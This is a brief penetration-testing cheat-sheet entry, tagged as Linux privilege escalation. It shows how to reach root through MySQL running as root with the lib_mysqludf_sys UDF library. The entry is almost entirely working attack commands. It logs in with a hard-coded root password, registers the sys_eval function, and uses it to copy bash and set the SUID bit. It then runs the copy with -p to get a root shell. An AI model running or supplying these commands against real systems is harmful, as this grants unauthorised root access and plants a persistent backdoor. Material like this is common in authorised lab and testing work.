---
title: MySQL Root - lib_mysqludf_sys SUID Trick
category: privesc
subcategory: linux-privesc
os: linux
command: select sys_eval("cp /bin/bash /var/tmp/bash; chmod u+s /var/tmp/bash");
tools: mysql
---


When MySQL runs as root and `lib_mysqludf_sys.so` is available:

```bash
mysql -uroot -phaslo
```

```sql
show databases;
use members;
CREATE FUNCTION sys_eval RETURNS INT SONAME 'lib_mysqludf_sys.so';
select sys_eval("cp /bin/bash /var/tmp/bash ; chmod u+s /var/tmp/bash");
exit
```

```bash
cd /var/tmp
./bash -p
```
